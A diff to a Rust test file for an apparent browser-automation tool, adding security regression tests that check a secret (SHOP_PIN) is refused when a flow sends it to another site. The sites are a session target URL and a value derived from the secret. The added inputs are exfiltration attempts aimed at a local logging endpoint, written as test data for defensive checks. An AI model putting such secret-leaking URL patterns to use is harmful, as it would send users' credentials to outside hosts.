@@ -275,6 +275,12 @@ async fn a_one_character_password_is_kept_on_its_site_and_masked_only_where_type
     assert!(out.contains("Step 7 of 7 passed. Add a product."), "ordinary text is not masked: {out}");
     let (ok, out) = call(&client, "run_flow", json!({ "flow": format!("- openUrl: \"http://localhost:{port}/log?p=${{SHOP_PIN}}\"\n") })).await;
     assert!(!ok && out.contains("only used on its own website"), "another site: {out}");
+    // Security #237 M1: a session's address and a value made from it in a runFlow env, too.
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": format!("- session: {{ start: evil, platform: web, target: \"http://localhost:{port}/log/s/${{SHOP_PIN}}\" }}\n") })).await;
+    assert!(!ok && out.contains("only used on its own website"), "a session's address: {out}");
+    let made = format!("- runFlow:\n    env:\n      MADE: \"${{SHOP_PIN}}x\"\n    commands:\n      - openUrl: \"http://localhost:{port}/log?m=${{MADE}}\"\n");
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": made, "session": "s" })).await;
+    assert!(!ok && out.contains("only used on its own website"), "a value made from it: {out}");
     tokio::time::sleep(std::time::Duration::from_millis(300)).await;
     assert!(!seen.lock().expect("seen").iter().any(|p| p.starts_with("/log")), "nothing reached the other site");
     client.cancel().await.expect("shutdown");
